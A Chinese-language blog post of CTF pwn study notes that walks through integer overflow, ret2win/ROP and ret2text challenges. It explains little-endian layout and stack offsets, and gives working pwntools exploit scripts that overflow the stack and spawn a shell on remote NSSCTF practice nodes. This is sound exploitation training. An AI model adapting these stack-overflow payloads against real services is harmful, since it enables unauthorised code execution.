---
title: PWN刷题笔记
published: 2026-04-12
description: ..第一次参加长城杯...这AWDP和ISW是什么啊，我不是密码、Misc方向的吗...发奋转型Pwn。
tags: [CTF, 学习,Pwn]
category: CTF
---
## 整数溢出
做这题我们需要先知道什么是小端序存储
假设一个无符号整型(unsigned long)0x6162636465666768
存储在内存0xA0000处
按从低到高字节顺序存储
0xA0000 -> 0x68

0xA0001 -> 0x67

0xA0002 -> 0x66

0xA0003 -> 0x65

0xA0004 -> 0x64

0xA0005 -> 0x63

0xA0006 -> 0x62

0xA0007 -> 0x61

（大端序则反之）
![整数溢出](./images/zhengshuyichu.webp)
如图，v4为4字节，却尝试用scanf将它视为%lld读入8字节整数，因此会覆盖到位于栈高字节的n1314（rbp-ch），当n1314等于520（0x208）时调用system，那便能拿到shell

因此输入0x20800000000在内存中为00 00 00 00 08 02,前面4个00即v4的内存区域，此时n1314被视为520

如果直接说有点抽象的话我们可以看一张图：
![整数溢出解释](./images/zhengshuyichu1.webp)
这下就很好理解了，那写exp就比较通透了：
```python
from pwn import *
r=remote('node7.anna.nssctf.cn',28805)
#r = process("./main")
context(os="linux",arch="amd64",log_level="debug")
num = 0x20865666768
#gdb.attach(r)
r.recvline()
r.sendline(str(num))
r.interactive()
```
![flag](./images/zhengshuyichu2.webp)

## ROP
![ROP](./images/ROP1.webp)
如图，scanf尝试向v4输入但没有上限(`%s`遇到回车才停止读取)，因此导致栈溢出 但是main函数里没有找到类似`system("/bin/sh")`的语句，于是通过查找字符串等方式我们不难发现在vuln这个函数中存在这个语句，那么我们的目的就是通过输入特定的字符串，让程序溢出到vuln函数
![ROP2](./images/ROP2.webp)
那么怎么return到vuln函数呢？其实让溢出的值是vuln函数的地址就行了。
```python
from pwn import *
context(os='linux',arch='amd64',log_level="debug")
r = remote('node7.anna.nssctf.cn', 23929)
vuln = 0x4011DD
playload = b"a"*0x28+p64(vuln)
r.recvline()
# gdb.attach(r)
r.sendline(playload)
r.interactive()
```
关于0x28，也就是没溢出的字节数是怎么来的，其实有很多方法，最基本的就是通过gdb慢慢调试出来，另一种就行在ida里看，就是[rbp-20h]=0x28。还有一种就是pwntools里的cyclic(~~最公式的一种~~)
![flag](./images/ROP3.webp)

## ret2text
![ret2text1](images/ret2text1.webp)
![ret2text2](images/ret2text2.webp)
这题其实和上一题没什么区别，只需要把跳转的地址转到if语句里就行了。**直接跳转到目标执行位置可以更好的解决问题**
在ida里找到if语句的地址便可以写exp了
![ret2text2](images/ret2text3.webp)
```python
from pwn import *
r = remote('node6.anna.nssctf.cn', 20798)
context(os='linux', arch='amd64', log_level='debug')
playload = b"a"*0x28+p64(0x4011ff)
#gdb.attach(r)
r.recvline()
r.sendline(playload)
r.interactive()
```